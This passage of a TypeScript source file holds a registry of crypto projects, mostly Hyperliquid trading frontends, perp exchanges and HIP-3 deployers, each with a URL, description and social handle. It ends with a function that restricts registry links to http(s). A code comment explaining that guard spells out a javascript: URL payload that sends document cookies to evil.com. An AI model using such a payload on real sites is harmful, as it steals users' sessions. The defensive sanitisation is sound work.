    twitter: "@Bitcoin",
  },
  "eth-usd": {
    url: "https://ethereum.org",
    description:
      "Ethereum, a proof-of-stake smart contract platform. Settlement layer for most DeFi, stablecoins, and L2 rollups; often called the world computer.",
    twitter: "@ethereum",
  },
  "sol-usd": {
    url: "https://solana.com",
    description:
      "Solana, a high-throughput monolithic L1 using proof-of-history with proof-of-stake. Low-latency execution layer for trading, payments, and consumer apps.",
    twitter: "@solana",
  },
  "bnb-usd": {
    url: "https://www.bnbchain.org",
    description:
      "BNB, the native asset of BNB Chain and Binance ecosystem. Used for gas on BNB Smart Chain and fee discounts on Binance exchange.",
    twitter: "@BNBCHAIN",
  },
  "xrp-usd": {
    url: "https://ripple.com/xrp",
    description:
      "XRP, the native asset of the XRP Ledger. Used for cross-border payments and liquidity bridging within the Ripple Labs ecosystem.",
    twitter: "@Ripple",
  },
  "ada-usd": {
    url: "https://cardano.org",
    description:
      "Cardano native token. PoS L1 using Ouroboros consensus, Haskell-based smart contracts via Plutus. ADA used for staking and fees.",
    twitter: "@Cardano",
  },
  "doge-usd": {
    url: "https://dogecoin.com",
    description:
      "Dogecoin native coin. Litecoin-derived PoW chain originating as a meme, widely used for tipping and small-value payments.",
    twitter: "@dogecoin",
  },
  "avax-usd": {
    url: "https://www.avax.network",
    description:
      "Avalanche native token. PoS L1 using Snowman consensus with a subnet architecture for app-specific chains. AVAX pays fees and secures the network.",
    twitter: "@avax",
  },
  "link-usd": {
    url: "https://chain.link",
    description:
      "Chainlink token. Powers a decentralized oracle network providing offchain data and compute, used for node payments and staking.",
    twitter: "@chainlink",
  },
  "matic-usd": {
    url: "https://polygon.technology",
    description:
      "Polygon ecosystem token, renamed from MATIC to POL in September 2024. Gas and staking asset across Polygon PoS and the AggLayer stack.",
    twitter: "@0xPolygon",
  },

  // ─── Hyperliquid frontends (bench № 030) ─────────────────────────
  "phantom-perps": {
    url: "https://phantom.app",
    description:
      "Phantom is the leading multi-chain crypto wallet on Solana, Ethereum, and Bitcoin; its Hyperliquid perps tab routes orders with a registered builder code so users trade HL directly from the wallet UI.",
    twitter: "@phantom",
  },
  axiom: {
    url: "https://axiom.trade",
    description:
      "Axiom is a Solana-native trading terminal expanding to Hyperliquid perps with a registered builder code, focused on advanced order types and pro-trader UX.",
    twitter: "@AxiomExchange",
  },
  "pvp-trade": {
    url: "https://pvp.trade",
    description:
      "pvp.trade runs social PvP trading rooms on Hyperliquid where friends bet against each other on perp positions, with a registered builder code on every routed order.",
    twitter: "@pvptrade",
  },
  insilico: {
    url: "https://insilicoterminal.com",
    description:
      "Insilico Terminal is an institutional trading workstation for Hyperliquid perps, with risk controls, order ladders, and a registered builder code for attribution.",
    twitter: "@InsilicoFinance",
  },
  defiapp: {
    url: "https://defi.app",
    description:
      "Defiapp is a cross-chain DeFi front-end that routes Hyperliquid perps orders via a registered builder code, exposing HL alongside spot and bridge flows in one UI.",
    twitter: "@defidotapp",
  },
  metamask: {
    url: "https://metamask.io",
    description:
      "MetaMask is the largest self-custody EVM wallet; its Hyperliquid integration routes perps orders through a registered builder code so users can trade HL from within the wallet.",
    twitter: "@MetaMask",
  },
  dexari: {
    url: "https://dexari.com",
    description:
      "Dexari is a pro trading UI for Hyperliquid perps focused on power users; orders carry a registered builder code for on-chain attribution.",
    twitter: "@DexariDotCom",
  },
  okto: {
    url: "https://okto.tech",
    description:
      "Okto is a self-custody multi-chain wallet by Coinswitch with a Hyperliquid perps integration that routes orders through a registered builder code.",
    twitter: "@okto_web3",
  },

  // ─── Hyperliquid frontends registry expansion 8 → 60 (DefiLlama sync) ───
  "trust-wallet": {
    url: "https://trustwallet.com",
    description:
      "Trust Wallet is a 220M user self custody mobile wallet that ships a native Hyperliquid perps tab routing orders with a registered builder code from inside the app.",
    twitter: "@TrustWallet",
  },
  sushi: {
    url: "https://www.sushi.com",
    description:
      "Sushi is a multichain DEX whose Sushi Perps v2 frontend routes orders into the Hyperliquid orderbook via a builder code, layering Sushi points incentives on top.",
    twitter: "@SushiSwap",
  },
  dreamcash: {
    url: "https://dreamcash.xyz",
    description:
      "Dreamcash is a mobile trading app for crypto, perps and HIP 3 RWAs that fronts Hyperliquid execution with a registered builder code and points rewards.",
    twitter: "@Dreamcash",
  },
  "based-app": {
    url: "https://basedapp.io",
    description:
      "Based is a Hyperliquid super app combining perps, prediction markets and a Visa card; one of the top builders by perp volume on Hyperliquid, running its own Builder on Builder program.",
    twitter: "@basedappHQ",
  },
  perpmate: {
    url: "https://perpmate.com",
    description:
      "Perpmate is an AI Telegram bot and web dashboard for one tap cross chain Hyperliquid perp trading, parsing natural language orders and executing via a registered builder code.",
    twitter: "@perpmate",
  },
  arena: {
    url: "https://arena.social",
    description:
      "The Arena is an Avalanche based SocialFi app whose Arena perps feature routes orders to Hyperliquid and exposes copy trading of those positions, using a registered builder code.",
    twitter: "@TheArenaApp",
  },
  minaraai: {
    url: "https://minara.ai",
    description:
      "Minara is an AI agent for trading that executes Hyperliquid perps via Copilot signal assisted or Autopilot automated modes, routing orders with a registered builder code.",
    twitter: "@minara__ai",
  },
  apexliquid: {
    url: "https://apexliquid.io",
    description:
      "ApexLiquid is a Telegram bot and smart wallet that auto copies on chain smart money traders on Hyperliquid in roughly one second, routing mirrored fills via a registered builder code.",
    twitter: "@Apexliquid_bot",
  },
  coin98: {
    url: "https://coin98.com",
    description:
      "Coin98 is a multi chain wallet super app whose perpetuals interface aggregates Hyperliquid alongside GMX and other venues, routing Hyperliquid fills via a registered builder code.",
    twitter: "@coin98_wallet",
  },
  coinpilot: {
    url: "https://www.trycoinpilot.com",
    description:
      "Coinpilot is a non custodial mobile copy trading app that mirrors top Hyperliquid traders' perp positions in real time using a registered builder code.",
    twitter: "@trycoinpilot",
  },
  echosync: {
    url: "https://www.echosync.io",
    description:
      "EchoSync is a copy trading platform for Hyperliquid and Aster that replicates top traders' perp positions with configurable ratios, executing via a registered builder code.",
    twitter: "@echosync",
  },
  fomo: {
    url: "https://fomo.family",
    description:
      "FOMO is a social trading app on Telegram, iOS and Android that surfaces signals from consistently profitable Hyperliquid traders and routes perp orders via a registered builder code.",
    twitter: "@tryfomo",
  },
  dextrabot: {
    url: "https://dextrabot.com",
    description:
      "Dextrabot is a copy trading platform and Telegram bot that discovers, analyzes and auto copies top Hyperliquid perp wallets, routing orders via a registered builder code.",
    twitter: "@dextrabot",
  },
  kinto: {
    url: "https://kinto.xyz",
    description:
      "Kinto was a non custodial smart wallet modular exchange that routed perps trading into Hyperliquid via a registered builder code. The project announced its shutdown in September 2025; its builder address remains on chain.",
    twitter: "@KintoXYZ",
  },
  hypersignals: {
    url: "https://hypersignals.ai",
    description:
      "HyperSignals (formerly Nomy) is a social and copy trading platform with trader analytics built on Hyperliquid, executing perp orders via a registered builder code.",
    twitter: "@HyperSignals_ai",
  },
  ccxt: {
    url: "https://ccxt.com",
    description:
      "CCXT is the open source multi exchange trading library. Its Hyperliquid integration attaches the CCXT builder code to orders by default, making it one of the largest programmatic flow routers on HL.",
    twitter: "@ccxt_official",
  },
  splash: {
    url: "https://splashwallet.xyz",
    description:
      "Splash is a self custodial iOS wallet built for trading Hyperliquid perps from mobile, routing orders via a registered builder code.",
    twitter: "@splashOS",
  },
  vooi: {
    url: "https://vooi.io",
    description:
      "VOOI is a cross chain perp DEX aggregator with gasless unified balances that charges a small builder fee on orders routed into Hyperliquid.",
    twitter: "@vooi_io",
  },
  hyperx: {
    url: "https://hyperx.trade",
    description:
      "HyperX is a Hyperliquid copy trading and smart money analytics platform with a web dashboard and Telegram bot, executing via a registered builder code.",
    twitter: "@hyperx_trade",
  },
  miracle: {
    url: "https://miracletrade.com",
    description:
      "Miracle is a mobile native multi venue perps app (Hyperliquid, Extended, Nado) with unified balances and lossback on liquidations, routing HL orders via a registered builder code.",
    twitter: "@miracletrade",
  },
  xbit: {
    url: "https://xbit.com",
    description:
      "XBIT is a decentralized aggregated trading platform with embedded wallets whose perp orders route into Hyperliquid via a registered builder code.",
    twitter: "@XBITDEX",
  },
  "tuleep-trade": {
    url: "https://tuleep.trade",
    description:
      "tuleep.trade is a multi exchange trading terminal focused on news trading; its Hyperliquid orders carry a registered builder code.",
    twitter: "@tuleep_trade",
  },
  "aura-money": {
    url: "https://aura.money",
    description:
      "Aura is a mobile first app for trading Hyperliquid perps, spot and HIP 3 markets plus Polymarket predictions, with social groups, routing orders via a registered builder code.",
    twitter: "@auramoney",
  },
  "cro-trade": {
    url: "https://cro.trade",
    description:
      "cro.trade is a Cronos ecosystem trading app whose perps trading routes through Hyperliquid via a registered builder code.",
    twitter: "@crotrade",
  },
  owlyfi: {
    url: "https://owly.fi",
    description:
      "Owly.fi is a non custodial AI powered copy trading and asset management terminal on Hyperliquid, executing perp orders via a registered builder code.",
    twitter: "@owlyfi",
  },
  topdog: {
    url: "https://topdog.gg",
    description:
      "TopDog is a Discord signal bot delivering real time trade alerts from top performing Hyperliquid wallets, with execution routed via a registered builder code.",
  },
  goodcryptox: {
    url: "https://goodcrypto.app",
    description:
      "goodcryptoX is a multi exchange DEX trading bot platform (grid, DCA, copy trading) that charges a Hyperliquid builder fee on perp trades.",
    twitter: "@GoodCryptoApp",
  },
  "origami-tech": {
    url: "https://origami.tech",
    description:
      "Origami Tech is a cloud trading bot terminal automating spot and perps across CEXes and Hyperliquid, including HIP 3 markets, via a registered builder code.",
    twitter: "@origamitech_",
  },
  cwallet: {
    url: "https://cwallet.com",
    description:
      "Cwallet is a multi chain wallet offering spot and futures trading positioned as a gateway to Hyperliquid markets, routing perp orders via a registered builder code.",
    twitter: "@CwalletOfficial",
  },
  onchaincc: {
    url: "https://onchain.cc",
    description:
      "Onchain.cc is a Bitso built self custodial trading terminal aggregating spot, memecoins and perps; its perpetuals execute on Hyperliquid via a registered builder code.",
    twitter: "@Onchaincc",
  },
  "kucoin-web3": {
    url: "https://www.kucoin.com/web3",
    description:
      "KuCoin Web3 Wallet is KuCoin's self custody wallet with native in wallet perps routed through Hyperliquid, including HIP 3 markets.",
    twitter: "@KuCoin_Web3",
  },
  vergex: {
    url: "https://vergex.trade",
    description:
      "VergeX is an AI trading layer built on the open source NoFx engine, running automated strategies on exchanges including Hyperliquid via a registered builder code.",
    twitter: "@vergex_ai",
  },
  nansen: {
    url: "https://www.nansen.ai",
    description:
      "Nansen is the onchain analytics platform; its perps trading product routes orders into Hyperliquid and earns builder fees under the NSN builder code.",
    twitter: "@nansen_ai",
  },
  gemwallet: {
    url: "https://gemwallet.com",
    description:
      "Gem Wallet is a multichain self custody mobile wallet with a built in Trade Perpetuals section that routes orders directly into Hyperliquid via a registered builder code.",
    twitter: "@GemWalletApp",
  },
  "gtr-trade": {
    url: "https://gtr.trade",
    description:
      "GTR.Trade is a self custodial mobile perps trading terminal for crypto, memecoins and RWA perps that routes orders into Hyperliquid using a registered builder code.",
    twitter: "@GTRTrade",
  },
  hyprearn: {
    url: "https://hyprearn.com",
    description:
      "HyprEarn is an AI assistant for Hyperliquid perps that generates one click trade setups across HL pairs and HIP 3 markets, executed via a registered builder code.",
    twitter: "@HyprEarn",
  },
  "legend-trade": {
    url: "https://www.legend.trade",
    description:
      "Legend is a social and gamified perp trading platform that lets users discover and copy top Hyperliquid traders, routing fills via a registered builder code.",
    twitter: "@legendtrade",
  },
  katoshi: {
    url: "https://katoshi.ai",
    description:
      "Trading automation engine for Hyperliquid offering bots, scripting, MCP and API tooling with 19 endpoints for strategy execution.",
    twitter: "@KatoshiAI",
  },
  metascalp: {
    url: "https://metascalp.io",
    description:
      "Free Windows desktop scalping terminal aggregating 14+ exchanges including Hyperliquid with order book, cluster, and tape analysis.",
    twitter: "@metascalp",
  },
  moontrader: {
    url: "https://www.moontrader.com",
    description:
      "Pro crypto trading terminal for HFT, scalping, and algo strategies across Binance, Bybit, OKX, and Hyperliquid.",
    twitter: "@MoonTrader_io",
  },
  onekey: {
    url: "https://onekey.so",
    description:
      "Open source hardware and software wallet with native OneKey Perps integration for trading Hyperliquid perpetuals from any device.",
    twitter: "@OneKeyHQ",
  },
  pear: {
    url: "https://www.pear.garden",
    description:
      "DeFi native pair trading terminal enabling one click long short ratio trades on top of Hyperliquid, GMX, and SYMMIO.",
    twitter: "@pear_protocol",
  },
  rabby: {
    url: "https://rabby.io",
    description:
      "Open source EVM browser wallet with built in Rabby Perps powered by Hyperliquid for in wallet perpetual futures trading.",
    twitter: "@Rabby_io",
  },
  "ranger-finance": {
    url: "https://ranger.finance",
    description:
      "Solana's first perps DEX aggregator with smart order routing across Drift, Jupiter, Flash, and Hyperliquid via cross chain relayers.",
    twitter: "@ranger_finance",
  },
  senpi: {
    url: "https://www.senpi.ai",
    description:
      "Personal AI trading agent platform for Hyperliquid letting users deploy non custodial autonomous bots controlled via Telegram chat.",
    twitter: "@senpi_ai",
  },
  superx: {
    url: "https://trysuper.co",
    description:
      "Hyperliquid trading dashboard and Telegram bot offering discretionary perps trading and copy trading from curated vaults and wallets.",
    twitter: "@trysuper_",
  },
  supurr: {
    url: "https://supurr.app",
    description:
      "Short dated options protocol on Hyperliquid offering Up Down binary contracts with fixed max loss.",
    twitter: "@supurr_app",
  },
  unigox: {
    url: "https://www.unigox.com",
    description:
      "Fiat to crypto P2P onramp covering 40+ local payment rails with a gasless non custodial wallet and Hyperliquid perps integration.",
    twitter: "@Unigox_global",
  },
  uxuy: {
    url: "https://www.uxuy.com",
    description:
      "Multi chain self custody wallet and AI stablecoin trading protocol for gasless cross chain swaps backed by Binance Labs.",
    twitter: "@uxuycom",
  },
  wunder: {
    url: "https://wundertrading.com",
    description:
      "Automated crypto trading platform with grid, DCA, signal, and TradingView bots integrated with Hyperliquid via WalletConnect.",
    twitter: "@wunder_bit",
  },
  grider: {
    url: "https://app.grider.xyz",
    description:
      "Non custodial grid trading tool for Hyperliquid that automates order placement across predefined price ranges with 24/7 execution.",
    twitter: "@griderxyz",
  },
  tradoor: {
    url: "https://tradoor0.xyz",
    description:
      "Automated market making platform for deploying one click delta neutral strategies across Hyperliquid, Extended, and HIP 3 perp DEXes.",
    twitter: "@tradoor0",
  },
  bullpenfi: {
    url: "https://bullpen.fi",
    description:
      "Non custodial multi platform trading terminal unifying Hyperliquid perps, Polymarket prediction markets, and Solana spot in one app.",
    twitter: "@BullpenFi",
  },
  "dexly-trade": {
    url: "https://dexly.trade",
    description:
      "Wallet first non custodial trading interface for Hyperliquid perps with copy trading, vaults, leaderboards, and wallet explorer.",
    twitter: "@dexlytrade",
  },
  hyperdash: {
    url: "https://hyperdash.com",
    description:
      "Advanced trading terminal for Hyperliquid offering real time analytics, portfolio tracking, and copytrading vaults.",
    twitter: "@hypurrdash",
  },
  infinex: {
    url: "https://infinex.xyz",
    description:
      "Passkey secured, non custodial crypto wallet and DeFi superapp with perpetual futures trading powered by Hyperliquid.",
    twitter: "@infinex",
  },
  liminal: {
    url: "https://liminal.money",
    description:
      "Delta neutral yield protocol on Hyperliquid that captures funding rate yield by pairing spot and perp positions on USDC deposits.",
    twitter: "@liminalmoney",
  },
  "liquid-perps": {
    url: "https://tryliquid.xyz",
    description:
      "Non custodial leveraged trading app on Hyperliquid offering perps on BTC, ETH and trending tokens with up to 150x leverage.",
    twitter: "@liquidtrading",
  },
  "lit-trade": {
    url: "https://lit.trade",
    description:
      "No KYC spot and perpetual trading frontend on Hyperliquid with on chart orders, trailing stops, and modular multi chart UI.",
    twitter: "@lit_trade",
  },
  lootbase: {
    url: "https://lootbase.com",
    description:
      "Mobile first Hyperliquid trading app rebranded as Stack offering perps up to 40x leverage with fiat ramps via MoonPay.",
    twitter: "@LootbaseX",
  },
  "mass-dot-money": {
    url: "https://mass.money",
    description:
      "Mobile first DeFi aggregator using account abstraction to unify spot, perps and tokenized stock trading across chains including Hyperliquid.",
    twitter: "@massdotmoney",
  },
  moonbot: {
    url: "https://moon-bot.com",
    description:
      "Advanced manual and automated trading terminal supporting CEXs and Hyperliquid with on chart order placement and strategy automation.",
    twitter: "@moonboteth",
  },
  rainbow: {
    url: "https://rainbow.me",
    description:
      "Self custodial Ethereum wallet whose iOS and Android apps integrate Rainbow Perps powered by Hyperliquid for up to 40x leverage trading.",
    twitter: "@rainbowdotme",
  },
  supercexy: {
    url: "https://supercexy.com",
    description:
      "Gasless mobile first frontend on Hyperliquid offering perpetual and spot trading with up to 50x leverage and a CEX style UX.",
    twitter: "@try_supercexy",
  },
  superstack: {
    url: "https://superstack.xyz",
    description:
      "Custom built trading platform on Hyperliquid bringing institutional grade tools and capital efficiency to retail traders.",
    twitter: "@superstackxyz",
  },
  "wallet-v": {
    url: "https://walletv.io",
    description:
      "Self custodial mobile wallet that connects AI agents to automate trading on Hyperliquid and Aster.",
    twitter: "@WalletV_io",
  },
  "xtrade-protocol": {
    url: "https://xtrade.gg",
    description:
      "All in one DeFi trading terminal supporting Solana spot and Hyperliquid perpetuals with pro grade tooling for retail traders.",
    twitter: "@xtrade_gg",
  },
  "taco-trade": {
    url: "https://app.taco.trade",
    description:
      "Hyperliquid perpetuals trading interface earning builder code revenue on Hyperliquid Perps fills.",
    twitter: "@TacoTradeX",
  },
  silhouette: {
    url: "https://silhouette.exchange",
    description:
      "Privacy enforcement layer on Hyperliquid that shields order details using TEEs and encrypted relays for confidential perp trading.",
    twitter: "@silhouette_ex",
  },
  "tread-fi": {
    url: "https://tread.fi",
    description:
      "Institutional grade algorithmic trading terminal and OEMS for retail and pro traders, integrated with Hyperliquid and major CEXs.",
    twitter: "@tread_fi",
  },
  flowbot: {
    url: "https://flowbot.pro",
    description:
      "Automated volume trading bot built to help traders earn perp DEX points and rewards on Hyperliquid without manual market making.",
    twitter: "@T0nyCrypt0",
  },
  "nautilus-trader": {
    url: "https://nautilustrader.io",
    description:
      "Open source Rust native production grade trading engine with a Hyperliquid integration for live perpetual futures execution.",
    twitter: "@NautilusTrader",
  },
  blink: {
    url: "https://www.blink.trade",
    description:
      "High-performance spot and perpetuals exchange with colocated low-latency fiber and independently verifiable sequencing. Routes Hyperliquid perp orders via a registered builder code.",
    twitter: "@Blink_Exchange",
  },

  // ─── Hyperliquid frontends registry expansion 60 → 65 (on-chain referral code cross-reference, 2026-06-28) ───
  // Identified by matching each builder address's HL referral code to a
  // public brand. Provenance lives in /opt/hl-bench/builders.json notes
  // on the HL node.
  blocksec: {
    url: "https://blocksec.com",
    description:
      "BlockSec is a blockchain security company behind the Phalcon toolchain, audits and attack monitoring. Its Anti-MEV RPC applies private transaction routing to shield Ethereum and BSC users from sandwich attacks.",
    twitter: "@BlockSecTeam",
  },
  "48club": {
    url: "https://48.club",
    description:
      "48 Club is a BNB Chain validator collective behind the KOGE token. Its Privacy RPC, successor of Puissant, routes BSC transactions privately through its own validators to prevent frontrunning.",
  },
  pancakeswap: {
    url: "https://pancakeswap.finance",
    description:
      "PancakeSwap is the largest DEX on BNB Chain. MEV Guard is its user-facing protected RPC, powered by 48 Club infrastructure and shipped as the default anti-sandwich endpoint for PancakeSwap traders.",
    twitter: "@PancakeSwap",
  },
  "defi-saver": {
    url: "https://defisaver.com",
    description:
      "DeFi Saver is a long-running DeFi management dashboard that added a Hyperliquid perps tab routing orders via a registered builder code (HL referral code DFS).",
    twitter: "@DeFiSaver",
  },
  unitywallet: {
    url: "https://unitywallet.com",
    description:
      "UnityWallet is a self-custodial wallet with an in-app Hyperliquid perps integration that routes orders through a registered builder code (HL referral code UNITYWALLET).",
    twitter: "@unitywallet_",
  },
  invo: {
    url: "https://invoapp.com",
    description:
      "Invo is a Hyperliquid-powered social trading mobile app supporting 170+ perp pairs with copy-trading and a registered builder code (HL referral code INVO, 25k+ referrals).",
    twitter: "@invoapp",
  },
  marsgo: {
    url: "https://t.me/marsgo_bot",
    description:
      "MarsGO is a Telegram mini-app for crypto trading that routes Hyperliquid perp orders through a registered builder code (HL referral code MARSGO).",
    twitter: "@MarsGOBot",
  },
  "bitget-wallet": {
    url: "https://web3.bitget.com",
    description:
      "Bitget Wallet is the self-custodial wallet by Bitget; its Hyperliquid perps integration launched Dec 2025 and routes orders through a registered builder code (HL referral code BITGETWALLET, 3.6k+ referrals).",
    twitter: "@BitgetWallet",
  },

  // ─── Perp funding venues (bench № 036) ─────────────────────────────
  bybit: {
    url: "https://www.bybit.com",
    description:
      "Bybit is one of the largest centralized derivatives exchanges, with USDT-margined linear perpetuals on hundreds of pairs and funding settled on 8 hour (some pairs 4 hour) periods.",
    twitter: "@Bybit_Official",
  },
  okx: {
    url: "https://www.okx.com",
    description:
      "OKX is a major centralized exchange whose USDT-margined perpetual swaps settle funding on variable periods (typically 8 hours), with rates capped per instrument.",
    twitter: "@okx",
  },
  paradex: {
    url: "https://www.paradex.trade",
    description:
      "Paradex is a perps-focused L2 exchange built on Starknet tech, with USD-settled perpetuals and funding accrued continuously over an 8 hour period.",
    twitter: "@paradex",
  },
  aster: {
    url: "https://www.asterdex.com",
    description:
      "Aster is a decentralized perps exchange (ex-ApolloX, backed by YZi Labs) on BNB Chain and other EVM networks, with a Binance-compatible API and 8 hour funding periods.",
    twitter: "@Aster_DEX",
  },

  // ─── Hyperliquid HIP-3 deployers (bench № 035) ─────────────────────
  xyz: {
    url: "https://trade.xyz",
    description:
      "trade.xyz operates the largest HIP-3 builder-deployed dex on Hyperliquid: 70+ tokenized US equity, index, and commodity perp markets under the xyz namespace, collecting a deployer fee on every fill.",
    chains: ["hyperliquid"],
    features: [
      "Tokenized US equity perps (AAPL, TSLA, NVDA and 70+ markets)",
      "Index and commodity perpetuals",
      "HIP-3 namespace xyz on HyperCore",
      "Deployer fee collected via the on-chain deployerFee field",
    ],
  },
  vntl: {
    url: "https://ventuals.com",
    description:
      "Ventuals runs pre-IPO valuation perpetuals on Hyperliquid under the vntl HIP-3 namespace: traders price private company valuations (MAG7-style baskets and single names) rather than listed stock.",
    twitter: "@ventuals",
    chains: ["hyperliquid"],
    features: [
      "Pre-IPO valuation perpetual markets",
      "HIP-3 namespace vntl on HyperCore",
      "Deployer fee collected via the on-chain deployerFee field",
    ],
  },
  cash: {
    url: "https://dreamcash.io",
    description:
      "Dreamcash operates the cash HIP-3 namespace on Hyperliquid, deploying tokenized equity and ETF perp markets that complement its mobile trading app (which also routes orders with a registered builder code).",
    twitter: "@Dreamcash",
    chains: ["hyperliquid"],
    parent: "dreamcash",
    features: [
      "Tokenized equity and ETF perpetuals",
      "HIP-3 namespace cash on HyperCore",
      "Deployer fee collected via the on-chain deployerFee field",
    ],
  },
  km: {
    url: "https://kinetiq.xyz",
    description:
      "Markets by Kinetiq is the HIP-3 dex of Kinetiq, the Hyperliquid liquid staking protocol; it deploys equity and index basket perp markets under the km namespace.",
    chains: ["hyperliquid"],
    features: [
      "Equity and index basket perpetuals",
      "HIP-3 namespace km on HyperCore",
      "Operated by the Kinetiq liquid staking team",
    ],
  },
  hyna: {
    url: "https://hyena.trade",
    description:
      "HyENA is a USDe-margined perp dex on Hyperliquid built by the Based team with Ethena support, running under the hyna HIP-3 namespace.",
    chains: ["hyperliquid"],
    features: [
      "USDe collateral perpetual markets",
      "HIP-3 namespace hyna on HyperCore",
      "Built by the Based team with Ethena support",
    ],
  },
  flx: {
    url: "https://usefelix.xyz",
    description:
      "Felix Exchange is the HIP-3 dex of Felix, the Hyperliquid-native lending and stablecoin protocol; it deploys commodity and macro perp markets under the flx namespace.",
    chains: ["hyperliquid"],
    features: [
      "Commodity and macro perpetuals",
      "HIP-3 namespace flx on HyperCore",
      "Operated by the Felix protocol team",
    ],
  },
  para: {
    url: "https://paragon.trade",
    description:
      "Paragon turns crypto-native indices (BTC dominance, TOTAL2, OTHERS) into perpetual futures on Hyperliquid under the para HIP-3 namespace, settled in USDC with cross-margin.",
    twitter: "@tradeparagon",
    chains: ["hyperliquid"],
    features: [
      "Crypto index perpetuals (BTC.D, TOTAL2, OTHERS)",
      "HIP-3 namespace para on HyperCore",
      "Deployer fee collected via the on-chain deployerFee field",
    ],
  },

  // ─── Perp DEX cohort (perps hub /perps) ───
  drift: {
    url: "https://drift.trade",
    description:
      "Solana perp DEX with hybrid AMM/orderbook model, sub-second matching via Anchor program.",
    twitter: "@DriftProtocol",
  },
  vertex: {
    url: "https://www.nado.xyz",
    description:
      "Arbitrum perp and spot orderbook DEX with off-chain matching and on-chain settlement. Migrating to Ink Foundation.",
    twitter: "@vertex_protocol",
  },
  edgex: {
    url: "https://edgex.exchange",
    description:
      "zkSync-based perp DEX with low taker fees and a documented public REST API.",
    twitter: "@edgex_exchange",
  },
  extended: {
    url: "https://extended.exchange",
    description:
      "Starknet perp DEX (formerly X10) with order book matching and instant withdrawals via STARK proofs.",
    twitter: "@ExtendedExchange",
  },
  aevo: {
    url: "https://aevo.xyz",
    description:
      "OP Stack perp DEX with deep options support, event-driven flow.",
    twitter: "@aevoxyz",
  },
  pacifica: {
    url: "https://pacifica.fi",
    description:
      "Solana perp DEX optimized for high-frequency trading, oracle-anchored funding.",
    twitter: "@pacifica_fi",
  },
  variational: {
    url: "https://variational.io",
    description:
      "Arbitrum P2P derivatives venue with pre-computed quote sizes for institutional flow.",
    twitter: "@variational_io",
  },
  ostium: {
    url: "https://ostium.app",
    description:
      "Arbitrum-based perp DEX specialized in RWA exposure including FX, commodities and indices.",
    twitter: "@ostium_app",
  },
  grvt: {
    url: "https://grvt.io",
    description:
      "zkSync hybrid CEX/DEX perp venue with privacy-preserving order matching.",
    twitter: "@grvt_io",
  },
};

/**
 * Scheme allowlist for any registry URL that ends up in an `<a href>` or
 * JSON-LD `sameAs` field. React does not block `javascript:` schemes on
 * `<a>` (it only warns in dev), so a malicious PR could inject
 * `javascript:fetch('//evil.com?'+document.cookie)` and exfiltrate
 * same-origin cookies/localStorage when the link is clicked.
 *
 * Returns the URL when safe, `undefined` when the scheme isn't http(s).
 * Callers should treat undefined as "no link" rather than rendering raw.
 */
export function safeRegistryURL(raw: string | undefined): string | undefined {
  if (!raw) return undefined;
  try {
    const u = new URL(raw);
    if (u.protocol === "http:" || u.protocol === "https:") return raw;
  } catch {
    // not a parseable URL — drop it
  }
  return undefined;
}

export function getProviderRegistry(slug: string): ProviderRegistryEntry | undefined {
  const entry = PROVIDER_REGISTRY[slug.toLowerCase()];
  if (!entry) return undefined;
  // Sanitise every URL-bearing field at the access boundary so render
  // sites don't have to remember to filter.
  return {
    ...entry,
    url: safeRegistryURL(entry.url) ?? "",
    docs: safeRegistryURL(entry.docs),
    github: safeRegistryURL(entry.github),
    blog: safeRegistryURL(entry.blog),
  };
}
